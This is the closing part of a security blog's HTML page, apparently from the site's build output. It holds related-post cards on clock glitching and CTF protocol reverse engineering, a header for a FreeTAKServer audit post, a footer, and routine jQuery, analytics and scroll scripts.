+                    <h2 class="post-card-title">Clock Glitching with a ChipWhisperer-Lite</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  What happens when things get out of sync?… SCIENCE!
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      6 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/reverse-engineering-an-unknown-digital-protocol">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/banner.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/reverse-engineering-an-unknown-digital-protocol">
+                <header class="post-card-header">
+                    
+                        
+                            
+                               <span class="post-card-tags">Hardware</span>
+                            
+                        
+                            
+                               <span class="post-card-tags">Ctf</span>
+                            
+                        
+                            
+                                <span class="post-card-tags">Security</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">Reverse Engineering an unknown digital protocol: RHME2, Whac a mole</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>Who doesn’t like a classic game of whac-the-mole? This time the moles infiltrated deep into the backyard of a poor farmer’s family. The moles are ruining the crops, which the farmer desperately needs</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      8 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+        </div>
+    </div>
+</aside>
+
+<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="/">
+            
+                <img src="/assets/images/static/blog-icon.png" alt="Securityits.io icon" />
+            
+            <span>Securityits.io</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">Securityaudit of an OpenSource Software: FreeTAKServer</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Securityaudit+of+an+OpenSource+Software%3A+FreeTAKServer&amp;url=https://jekyllt.github.io/jasper2/securityaudit-of-an-open-source-project-takserver"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyllt.github.io/jasper2/securityaudit-of-an-open-source-project-takserver"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+
+        </a>
+    </div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+<!-- /post -->
+
+<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="/">Securityits.io</a> &copy; 2025</section>
+                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
+                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
+                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-115328400-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
